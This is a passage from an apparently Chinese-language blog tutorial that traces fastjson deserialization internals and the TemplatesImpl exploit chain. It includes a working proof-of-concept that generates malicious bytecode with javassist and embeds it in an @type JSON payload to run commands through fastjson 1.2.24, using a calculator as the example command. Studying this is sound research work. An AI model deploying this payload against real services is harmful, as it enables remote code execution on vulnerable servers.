(!annotation.deserialize()) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ordinal = annotation.ordinal();</span><br><span class="line">    serialzeFeatures = SerializerFeature.of(annotation.serialzeFeatures());</span><br><span class="line">    parserFeatures = Feature.of(annotation.parseFeatures());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (annotation.name().length() != <span class="number">0</span>) &#123;</span><br><span class="line">        String propertyName = annotation.name();</span><br><span class="line">        add(fieldList, <span class="keyword">new</span> FieldInfo(propertyName, method, <span class="keyword">null</span>, clazz, type, ordinal, serialzeFeatures, parserFeatures, </span><br><span class="line">                                     annotation, <span class="keyword">null</span>, <span class="keyword">null</span>));</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!methodName.startsWith(<span class="string">&quot;set&quot;</span>)) &#123; <span class="comment">// TODO &quot;set&quot;的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？</span></span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> c3 = methodName.charAt(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">String propertyName;</span><br><span class="line"><span class="keyword">if</span> (Character.isUpperCase(c3) <span class="comment">//</span></span><br><span class="line">    || c3 &gt; <span class="number">512</span> <span class="comment">// for unicode method name</span></span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">if</span> (TypeUtils.compatibleWithJavaBean) &#123;</span><br><span class="line">        propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;_&#x27;</span>) &#123;</span><br><span class="line">    propertyName = methodName.substring(<span class="number">4</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">    propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.length() &gt;= <span class="number">5</span> &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">4</span>))) &#123;</span><br><span class="line">    propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在处理的最后，会使用add()将找到的方法加进fieldList中，（add中的FieldInfo，会涉及到下面的getonly参数）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">add(fieldList, <span class="keyword">new</span> FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,</span><br><span class="line">                             annotation, fieldAnnotation, <span class="keyword">null</span>));</span><br></pre></td></tr></table></figure>

<p>第二个<code>for (Field field : clazz.getFields())</code>是遍历所有public的方法，</p>
<p>第三个与第一个类似，不过是getter方法</p>
<h3 id="getonly参数"><a href="#getonly参数" class="headerlink" title="getonly参数"></a>getonly参数</h3><p>在构造函数FieldInfo()中，有一个东西需要注意，getonly参数，如果getonly参数为false，会导致在<code>return deserializer.deserialze(this, clazz, fieldName);</code>内的调试出现问题，没办法跟踪代码，（具体是为啥不是很清楚，以后可以研究一下），需要让getonly参数为true，主要代码在FieldInfo.java中下面的代码。有两个条件，</p>
<ul>
<li>第一是代码要在走到这个FieldInfo.java中，这里需要从JavaBeanInfo.java中的<code>add(fieldList, new FieldInfo(propertyName, method, null, clazz, type, 0, 0, 0, annotation, null, null));</code>进去，</li>
<li>第二个是这里的第二个if ((types = method.getParameterTypes()).length == 1) </li>
</ul>
<p><img src="image-20240306171632737.png" alt="image-20240306171632737"></p>
<p>为了后续方便调试，这个参数需要为true，在FieldInfo()中，这个参数为true，需要 method.getParameterTypes()的长度不为1，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((types = method.getParameterTypes()).length == <span class="number">1</span>) </span><br></pre></td></tr></table></figure>

<p>然而在第一个for (Method method : methods) 循环中，有这样一个判断</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line"><span class="keyword">if</span> (types.length != <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以在第一个for循环中，是永远不能使getonly为true的。因为如果参数不为1,那就会被continue，代码根本走不到add()；如果参数为1,代码在走到了add(),那getonly就只能为false了。</p>
<p>所以需要看第二个for循环。</p>
<p>第二个for循环是找getter函数，构造的函数需要满足以下几个条件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数名大于4</span></span><br><span class="line"><span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) &#123;    </span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数不能是静态方法 static</span></span><br><span class="line"><span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;    </span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数需要以get开头，且第四个字符是大写</span></span><br><span class="line"><span class="keyword">if</span> (methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">3</span>))) &#123;  	</span><br><span class="line">     <span class="comment">//函数不能有入参</span></span><br><span class="line">    <span class="keyword">if</span> (method.getParameterTypes().length != <span class="number">0</span>) &#123;       </span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 函数返回值需要是以下几种类型 Collection,Map,AtomicBoolean,AtomicInteger,AtomicLong</span></span><br><span class="line"><span class="keyword">if</span> (Collection.class.isAssignableFrom(method.getReturnType()) <span class="comment">//    </span></span><br><span class="line">    || Map.class.isAssignableFrom(method.getReturnType()) <span class="comment">//</span></span><br><span class="line">    || AtomicBoolean.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">    || AtomicInteger.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">    || AtomicLong.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">) &#123;</span><br><span class="line">    …………</span><br><span class="line"><span class="comment">// fieldList中没有setter方法，简单说就是，如果getKey要满足条件，就不能出现满足条件的setKey</span></span><br><span class="line">    FieldInfo fieldInfo = getField(fieldList, propertyName);</span><br><span class="line">    <span class="keyword">if</span> (fieldInfo != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	…………</span><br><span class="line"> 	add(fieldList, <span class="keyword">new</span> FieldInfo(propertyName, method, <span class="keyword">null</span>, clazz, type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, annotation, <span class="keyword">null</span>, <span class="keyword">null</span>));</span><br><span class="line">    …………</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以为了将getonly变量为true，所需要构造的getter函数就可以简单写为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> AtomicBoolean <span class="title">getKey2</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//        Collection&lt;String&gt; re = null;</span></span><br><span class="line"><span class="comment">//        Map&lt;String,String&gt; re = null;</span></span><br><span class="line">        AtomicBoolean re = <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">//        AtomicInteger re = null;</span></span><br><span class="line"><span class="comment">//        AtomicLong re = null;</span></span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了setKey2&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.key1 = key1;</span><br><span class="line">        <span class="keyword">this</span>.key2 = key2;</span><br><span class="line">        <span class="keyword">return</span> re;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20231031130900988.png" alt="image-20231031130900988"></p>
<p>之后，代码跳出<code>JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);</code> 向下走到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (FieldInfo fieldInfo : beanInfo.fields) &#123;</span><br><span class="line">    <span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">        asmEnable = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    …………</span><br><span class="line">&#125;</span><br><span class="line">…………</span><br><span class="line"><span class="keyword">if</span> (!asmEnable) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> JavaBeanDeserializer(<span class="keyword">this</span>, clazz, type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就可以将asmEnable设置为false，随后<code> return new JavaBeanDeserializer(this, clazz, type);</code> 结束函数。</p>
<p>在return的时候，是new了一个新的JavaBeanDeserializer，所以还会在走一边之前的三个for循环那块的流程，然后退出到ParseConfig.java的<code>derializer = createJavaBeanDeserializer(clazz, type);</code>，再继续退出当前的getDeserializer()函数，回到getDeserializer()，最后退出到DefaultJSONParser.java的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectDeserializer deserializer = config.getDeserializer(clazz);</span><br><span class="line"><span class="keyword">return</span> deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure>

<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>通过调整getter函数，使用<code>ObjectDeserializer deserializer = config.getDeserializer(clazz);</code>获取到反序列化器后</p>
<p><del>退出到DefaultJSONParser.java的<code>return deserializer.deserialze(this, clazz, fieldName);</code>后，</del></p>
<p>跟进deserialze()方法，跳过一些重载方法后，来到JavaBeanDeserializer.java文件中。走到<code>object = createInstance(parser, type);</code>时。这里是新建一个实例，在这里面有一句<code>object = constructor.newInstance();</code>会执行指定了类的构造方法</p>
<p><img src="image-20231031161055222.png" alt="image-20231031161055222"></p>
<p><img src="image-20231031161113880.png" alt="image-20231031161113880"></p>
<p>之后在<code>fieldDeser.setValue(object, fieldValue);</code>中跟进，里面在经过层层if判断和其他的处理后，有一行反射代码<code>method.invoke(object, value);</code></p>
<p>在这执行了之前加入到fieldList的setter函数，</p>
<p>这里是setName</p>
<p><img src="image-20231031162125277.png" alt="image-20231031162125277"></p>
<p><img src="image-20231031162213983.png" alt="image-20231031162213983"></p>
<p>而被执行的getter方法，是在JSON.java的<code>return (JSONObject) JSON.toJSON(obj);</code>中被调用的，在使用parse()将字符串反序列化为对象后，判断对象类型是否是JSON，如果不是，就再使用toJSON()函数处理一下obj。</p>
<p><img src="image-20231031162843403.png" alt="image-20231031162843403"></p>
<p><img src="image-20231031163027896.png" alt="image-20231031163027896"></p>
<p>在toJSON中，通过<code>ObjectSerializer serializer = config.getObjectWriter(clazz);</code>获取ObjectSerializer：</p>
<p><img src="image-20231031170454368.png" alt="image-20231031170454368"></p>
<p><img src="image-20231031170522391.png" alt="image-20231031170522391"></p>
<p><img src="image-20231031170543611.png" alt="image-20231031170543611"></p>
<p><img src="image-20231031170617489.png" alt="image-20231031170617489"></p>
<p><img src="image-20231031170719435.png" alt="image-20231031170719435"></p>
<p>在获取到ObjectSerializer后，在<code>Map&lt;String, Object&gt; values = javaBeanSerializer.getFieldValuesMap(javaObject);</code>里面执行的getter方法，具体来看：</p>
<p>getFieldValuesMap() –&gt;  getter.getPropertyValue(object)  -&gt;  Object propertyValue =  fieldInfo.get(object);</p>
<p><img src="image-20231031171652499.png" alt="image-20231031171652499"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object javaObject)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123;</span><br><span class="line">        Object value = method.invoke(javaObject, <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="测试执行命令"><a href="#测试执行命令" class="headerlink" title="测试执行命令"></a>测试执行命令</h3><p>假如说在代码中有一个这样的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testcmd</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCmd</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果想要通过fastjson执行命令，可以这样写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void test7()&#123;</span><br><span class="line">    String cmd &#x3D; &quot;&#123;\&quot;@type\&quot;:\&quot;org.example.testcmd\&quot;,\&quot;cmd\&quot;:\&quot;gnome-calculator\&quot;&#125;&quot;;</span><br><span class="line">    Object P2 &#x3D; JSON.parseObject(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20231101095633776.png" alt="image-20231101095633776"></p>
<h2 id="寻找利用链"><a href="#寻找利用链" class="headerlink" title="寻找利用链"></a>寻找利用链</h2><p>对于java版本</p>
<p>RMI利用的JDK版本≤ JDK 6u132、7u122、8u113</p>
<p>LADP利用JDK版本≤ 6u211 、7u201、8u191</p>
<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>环境</p>
<ul>
<li>ubuntu 22.04</li>
<li>java version “1.8.0_102”</li>
</ul>
<p>poc：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line">…………</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test10</span><span class="params">()</span>   <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="comment">//        TemplatesImpl</span></span><br><span class="line">        <span class="comment">// 生成 evilcode</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass cc = pool.get(test.class.getName());</span><br><span class="line">        String cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;gnome-calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">&quot;akka1&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));</span><br><span class="line">        <span class="keyword">byte</span>[] evilCode = cc.toBytecode();</span><br><span class="line">        String evilCode_base64 = Base64.encodeBase64String(evilCode);</span><br><span class="line">        System.out.println(evilCode_base64);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造payload</span></span><br><span class="line">        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        String payload =</span><br><span class="line">                <span class="string">&quot;&#123;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,&quot;</span> + <span class="string">&quot;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evilCode_base64 + <span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#x27;_name&#x27;:&#x27;asd&#x27;,&#x27;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_tfactory&#x27;:&#123; &#125;,\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> + <span class="string">&quot;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        System.out.println(<span class="string">&quot;payload:&quot;</span>+payload);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 运行</span></span><br><span class="line">        Object obj = JSON.parseObject(payload, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>pom.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.19.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="image-20240308153958617.png" alt="image-20240308153958617"></p>
<p>首先该类中存在一个成员属性 <code>_class</code>，是一个 Class 类型的数组，数组里下标为<code>_transletIndex</code> 的类会在 <code>getTransletInstance()</code> 方法中使用 <code>newInstance()</code> 实例化。如下：</p>
<p><img src="image-20240311085936297.png" alt="image-20240311085936297"></p>
<p><img src="image-20240311085953511.png" alt="image-20240311085953511"></p>
<p>往回找，com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类中的 <code>getOutputProperties()</code> 方法调用 <code>newTransformer()</code> 方法，而 <code>newTransformer()</code> 又调用了 <code>getTransletInstance()</code> 方法。</p>
<p>getOutputProperties() -&gt; newTransformer() -&gt; getTransletInstance()</p>
<p>而 <code>getOutputProperties()</code> 方法就是类成员变量 <code>_outputProperties</code> 的 getter 方法。所以在使用fastjson反序列化时，如果设置了 <code>_outputProperties</code> 变量，就能在反序列化的过程中执行<code>getOutputProperties()</code>方法。</p>
<p><img src="image-20240311090549219.png" alt="image-20240311090549219"></p>
<p>现在需要知道这个 <code>_class[_transletIndex]</code>是否能由用户控制，<code>_transletIndex</code>也是一个变量，初始值为-1。</p>
<p><img src="image-20240311105310519.png" alt="image-20240311105310519"></p>
<p>ctrl+左键查找一下<code>_class</code>，发现在<code>TemplatesImpl()、readObject()、defineTransletClasses()</code>中都有赋值的操作。</p>
<p><img src="image-20240311091814919.png" alt="image-20240311091814919"></p>
<p>其中 <code>defineTransletClasses()</code> 在 <code>getTransletInstance()</code> 中，如果 <code>_class</code> 为空即会被调用，看一下 <code>defineTransletClasses()</code> 的逻辑</p>
<p><img src="image-20240311104717731.png" alt="image-20240311104717731"></p>
<p><img src="image-20240311104837084.png" alt="image-20240311104837084"></p>
<p>首先需要_bytecodes不为空，不然会报错结束这个方法。然后会调用自定义的 ClassLoader 去加载 <code>_bytecodes</code> 中的 <code>byte[]</code> 。而 <code>_bytecodes</code> 也是该类的成员属性。</p>
<p>在for循环中的if判断是为了判断这个类的父类是否为 <code>ABSTRACT_TRANSLET</code> 也就是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>。如果是，就会将类成员属性的<code>_transletIndex</code> 设置为当前循环中的标记位，比如说_bytecodes这个列表里面只有一个元素，此时for循环i=0,如果父类为 <code>ABSTRACT_TRANSLET</code> ，则<code>_transletIndex</code> 就为0。</p>
<p>另外，<code>_bytecodes</code>和<code>_name</code>都是没有setter方法的私有变量，所以想要在反序列化的时候为这两个变量赋值，需要在<code>parseObject()</code>时设置<code>Feature.SupportNonPublicField</code>；关于私有属性赋值的细节，我放在后面写一下。</p>
<p>整个利用链为：</p>
<ul>
<li>构造一个 TemplatesImpl 类的反序列化字符串，其中 <code>_bytecodes</code> 是我们构造的恶意类的类字节码，这个类的父类需要是 AbstractTranslet，最终这个类会被加载并使用 <code>newInstance()</code> 实例化。</li>
<li>在反序列化过程中，由于getter方法 <code>getOutputProperties()</code>，满足条件，将会被 fastjson 调用，而这个方法触发了整个漏洞利用流程：<code>getOutputProperties()</code> -&gt; <code>newTransformer()</code> -&gt; <code>getTransletInstance()</code> -&gt; <code>defineTransletClasses()</code> / <code>EvilClass.newInstance()</code>.</li>
</ul>
<h4 id="bytecodes私有属性的赋值"><a href="#bytecodes私有属性的赋值" class="headerlink" title="_bytecodes私有属性的赋值"></a>_bytecodes私有属性的赋值</h4><p>fastjson在反序列化字符串的时候，<br>1.如果变量是public，不需要setter类方法，字符串里写了，就能反序列化进去，<br>2.如果变量是private，需要有setter类方法才能反序列化进去，<br>3.如果变量是private，没有setter类方法。需要设置Feature.SupportNonPublicField才能能反序列化进去。</p>
<p>先准备这样一个类</p>
<p>user4.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.atomic.AtomicBoolean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">user4</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String key1;</span><br><span class="line">    <span class="keyword">private</span> String key2;</span><br><span class="line">    <span class="keyword">private</span> String _key3;</span><br><span class="line">    <span class="keyword">public</span> String _key4;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setKey1</span><span class="params">(String key1)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了setKey&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.key1 = key1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setKey2</span><span class="params">(String key2)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了setKey2&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.key2 = key2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">user4</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user构造函数user(无参数)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">user4</span><span class="params">(String key1,String key2)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user构造函数user(有参数)&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.key1 = key1;</span><br><span class="line">        <span class="keyword">this</span>.key2 = key2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;user&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;key1=&#x27;&quot;</span> + key1 + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, key2=&#x27;&quot;</span> + key2 + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, key3=&#x27;&quot;</span> + _key3 + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, key4=&#x27;&quot;</span> + _key4 + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后是poc代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test13</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String p1 = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user4\&quot;,\&quot;key1\&quot;:\&quot;key11\&quot;,\&quot;key2\&quot;:\&quot;key22\&quot;,\&quot;_key3\&quot;:\&quot;key33\&quot;,\&quot;_key4\&quot;:\&quot;key44\&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parse(p1):&quot;</span>);</span><br><span class="line"><span class="comment">//        Object P1 = JSON.parse(p1,Feature.SupportNonPublicField);</span></span><br><span class="line">        Object P1 = JSON.parse(p1);</span><br><span class="line">        System.out.println(<span class="string">&quot;===&gt; &quot;</span>+P1.toString());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20240312155625896.png" alt="image-20240312155625896"><img src="image-20240312155647214.png" alt="image-20240312155647214"></p>
<p>在user4里面，有四个变量key1，key2，key3，key4，其中key1，key2和key3都是私有变量(private)，但是key1和key2有setter类方法，key3则没有，而key4是公共变量(public)。所以在没有设置<code>Feature.SupportNonPublicField</code>时，totring()返回结果为<code>===&gt; user&#123;key1=&#39;key11&#39;, key2=&#39;key22&#39;, key3=&#39;null&#39;, key4=&#39;key44&#39;&#125;</code>。其中key3无法被赋值，为null。</p>
<p>而在设置了Feature.SupportNonPublicField后，key3就赋值成功了。</p>
<p>具体流程分析</p>
<p>在经过一次次回溯后，找到JavaBeanDeserializer.java#parseField()中。</p>
<p><img src="image-20240312162041859.png" alt="image-20240312162041859"></p>
<p><img src="image-20240312162149768.png" alt="image-20240312162149768"></p>
<p>当没有设置<code>Feature.SupportNonPublicField</code>时，fieldDeserializer为null，在经过<code>parser.parseExtra(object, key)</code>后就结束了（如上图），而在设置了<code>Feature.SupportNonPublicField</code>后，ieldDeserializer不为null，代码就会走到下面的<code>fieldDeserializer.parseField(parser, object, objectType, fieldValues)</code>中，在这里面通过`setValue(object, value) –&gt; field.set(object, value)将_key3通过反射进行赋值，</p>
<p><img src="image-20240312162458479.png" alt="image-20240312162458479"></p>
<p><img src="image-20240312170154792.png" alt="image-20240312170154792"></p>
<p>现在来看一下fieldDeserializer是如何被<code>Feature.SupportNonPublicField</code>影响的。</p>
<p>定义：没有区别</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FieldDeserializer fieldDeserializer &#x3D; smartMatch(key);</span><br></pre></td></tr></table></figure>

<p>赋值：</p>
<p>这是设置了<code>Feature.SupportNonPublicField</code>的。如果没设置这个特性，直接走不到这个地方。</p>
<p><img src="image-20240312171414009.png" alt="image-20240312171414009"></p>
<p>代码会在这个判断中返回false，自然就无法在里面为fieldDeserializer赋值</p>
<p><img src="image-20240312171803481.png" alt="image-20240312171803481"></p>
<p>这个判断里，fieldDeserializer == null默认为true，此时没有设置特性，所以后面两个都是false，当设置了特性后，<code>parser.lexer.isEnabled(mask) </code>的结果就为true了，</p>
